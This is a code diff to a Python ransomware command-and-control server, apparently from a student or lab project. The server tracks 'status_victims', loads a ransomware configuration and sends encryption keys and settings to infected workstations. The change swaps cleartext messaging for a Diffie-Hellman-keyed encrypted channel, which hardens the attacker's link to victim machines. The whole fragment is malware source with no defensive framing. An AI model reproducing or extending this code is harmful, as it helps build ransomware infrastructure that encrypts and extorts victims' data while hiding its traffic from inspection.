@@ -8,7 +8,7 @@ import socket
 from threading import Thread
 import utile.config as configg
 import utile.message as message
-from utile.network import recv_msg, send_msg, recv_msg_clear, send_msg_clear
+from utile.network import recv_msg, send_msg
 
 
 status_victims = {}
@@ -84,7 +84,8 @@ class serveur_frontal(object):
         global config_workstation
         global status_victims
         while True:
-            msg = recv_msg_clear(c_v)
+            key = security.diffie_hellmand_sendk(c_v)
+            msg = recv_msg(c_v, key)
             print(f'{msg}')
             msg_type = message.get_message_type(msg)
             msg = json.loads(msg)
@@ -120,5 +121,5 @@ class serveur_frontal(object):
                         config_ransomware['workstation.cfg']['FREQ'],
                         key_rsp['KEY']
                     ])
-                send_msg_clear(c_v, msg)
+                send_msg(c_v, msg, key)
 
